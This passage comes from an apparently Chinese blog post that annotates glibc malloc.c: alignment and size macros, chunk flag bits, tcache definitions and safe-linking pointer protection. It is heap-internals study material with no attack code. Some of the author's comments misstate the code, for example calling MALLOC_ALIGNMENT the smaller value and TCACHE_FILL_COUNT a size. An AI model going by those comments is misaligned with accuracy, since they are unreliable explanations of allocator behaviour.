class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">/*检查某个chunk是否对齐(判断末尾3(32位下)/4(64位下)比特位是否是0)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* MALLOC_ALIGNMENT定义在sysdeps/generic/malloc-alignment.h中，其定义如下</span></span><br><span class="line"><span class="comment">#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="comment">  ? __alignof__ (long double) : 2 * SIZE_SZ)</span></span><br><span class="line"><span class="comment">简而言之是取2 * SIZE_SZ与__alignof__ (long double)中较小的那个</span></span><br><span class="line"><span class="comment">其中__alignof__是获取类型的对齐结果</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*misaligned_chunk(p) 检查是否对齐，返回的是一个与值结果，如果未对齐返回的是非0*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == CHUNK_HDR_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">/* Note: This must be a macro that evaluates to a compile time constant</span></span><br><span class="line"><span class="comment">   if passed a literal constant.  */</span></span><br><span class="line"><span class="comment">/*将请求的大小转化为实际分配的size大小。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if REQ overflows when padded and aligned and if the resulting value</span></span><br><span class="line"><span class="comment">   is less than PTRDIFF_T.  Returns TRUE and the requested size or MINSIZE in</span></span><br><span class="line"><span class="comment">   case the value is less than MINSIZE on SZ or false if any of the previous</span></span><br><span class="line"><span class="comment">   check fail.  */</span></span><br></pre></td></tr></table></figure><h5 id="标志位相关的宏"><a href="#标志位相关的宏" class="headerlink" title="标志位相关的宏"></a>标志位相关的宏</h5><p>以及chunk的标志位相关的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   --------------- Physical chunk operations ---------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="comment">/*一个测试位，就是之前提到的mchunk_size中的末3位复用部分，最后一位代表了物理相邻的上一个chunk是否被使用*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="comment">/*与操作测试，判断上一个chunk是否被使用*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="comment">/*同，倒数第二位代表了该chunk是否被mmap分配*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*与操作测试，判断该chunk是否是mmap分配的*/</span></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="comment">/*同，倒数第二位代表了该chunk是否属于主线程*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*与操作测试，判断该chunk是否属于主线程(0代表属于主线程)*/</span></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="comment">/*或上 NON_MAIN_ARENA，把一个mark标记为不再属于主线程(*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*所有的测试位，当提取大小时需要被mask off*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="comment">/*忽略测试位，提取大小(简而言之就是mchunk_size末3比特位全部置0)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="comment">/*直接提取mchunk_size*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="comment">/*获取物理相邻的下一个chunk(本chunk的地址+本chunk大小)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*物理相邻上一个chunk的size(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*设置物理相邻上一个chunk的size(该chunk的 mchunk_prev_size)(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*上一个chunk的地址(该chunk的地址减去上一个chunk的大小)(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="comment">/*把地址ptr+offset处视为一个chunk*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="comment">/*检测chunk p是否被使用(也就是p下一个chunk的prev_inuse是否为1)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)      \</span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="comment">/* 设置 chunk p状态为被使用 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)      \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="line"><span class="comment">/* 清除 chunk p的被使用状态 */</span></span><br><span class="line">#define clear_inuse(p)      \</span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="comment">/*检查/设置/清楚 某个地方的inuse位*/</span></span><br><span class="line">#define inuse_bit_at_offset(p, s)      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line">#define set_inuse_bit_at_offset(p, s)      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="line"></span><br><span class="line">#define clear_inuse_bit_at_offset(p, s)      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">/*在不扰乱测试位的情况下设置大小 (个人感觉应该还需要对s进行一个检测把?)*/</span></span><br><span class="line">#define set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">/*直接更改mchunk_size(有可能改变测试位)*/</span></span><br><span class="line">#define set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">/*把p+s处的chunk的mchunk_prev_size写为s(只有当chunk p为不被使用的时候才行)*/</span></span><br><span class="line">#define set_foot(p, s)       (((mchunkptr) ((<span class="keyword">char</span> *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br><span class="line"></span><br><span class="line">#pragma GCC poison mchunk_size</span><br><span class="line">#pragma GCC poison mchunk_prev_size</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is the size of the real usable data in the chunk.  Not valid for</span></span><br><span class="line"><span class="comment">   dumped heap chunks.  */</span></span><br><span class="line"><span class="comment">/*用户真正使用的部分大小(也就是之前说的数据部分)*/</span></span><br><span class="line">#define memsize(p)                                                    \</span><br><span class="line">  (__MTAG_GRANULE_SIZE &gt; SIZE_SZ &amp;&amp; __glibc_unlikely (mtag_enabled) ? \</span><br><span class="line">    chunksize (p) - CHUNK_HDR_SZ :                                    \</span><br><span class="line">    chunksize (p) - CHUNK_HDR_SZ + (chunk_is_mmapped (p) ? <span class="number">0</span> : SIZE_SZ))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If memory tagging is enabled the layout changes to accommodate the granule</span></span><br><span class="line"><span class="comment">   size, this is wasteful for small allocations so not done by default.</span></span><br><span class="line"><span class="comment">   Both the chunk header and user data has to be granule aligned.  */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Tcache相关的宏"><a href="#Tcache相关的宏" class="headerlink" title="Tcache相关的宏"></a>Tcache相关的宏</h5><p>还有一些tcache用到的宏(tcache是啥？是一种bin。bin是啥？后面就介绍了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="comment">/*TCACHE_MAX_BINS应该是定义了最多的条目数量。这个限制不是绝对的，而是可更改的*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="comment">/*最大的能放进tcache的SIZE，*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="comment">/*换算出对应id的tcache bin所收录的chunk的大小*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="comment">/*从chunksize()提供的size换算到符合的tcache bin的id*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="comment">/*从用户提供的size换算到符合的tcache bin的id*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="comment">/*决定了每个tcache bin所能容纳的chunk大小*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="comment">/*似乎是全体tcache bins所能容纳的chunk的数量*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="comment">/*glibc 2.32后引入的指针加密的操作，主要是一个简单的右移异或的加密方式*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在malloc.c后半段也有一些关于Tcache的宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The value of tcache_key does not really have to be a cryptographically</span></span><br><span class="line"><span class="comment">   secure random number.  It only needs to be arbitrary enough so that it does</span></span><br><span class="line"><span class="comment">   not collide with values present in applications.  If a collision does happen</span></span><br><span class="line"><span class="comment">   consistently enough, it could cause a degradation in performance since the</span></span><br><span class="line"><span class="comment">   entire list is checked to check if the block indeed has been freed the</span></span><br><span class="line"><span class="comment">   second time.  The odds of this happening are exceedingly low though, about 1</span></span><br><span class="line"><span class="comment">   in 2^wordsize.  There is probably a higher chance of the performance</span></span><br><span class="line"><span class="comment">   degradation being due to a double free where the first free happened in a</span></span><br><span class="line"><span class="comment">   different thread; that&#x27;s a case this check does not cover.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR 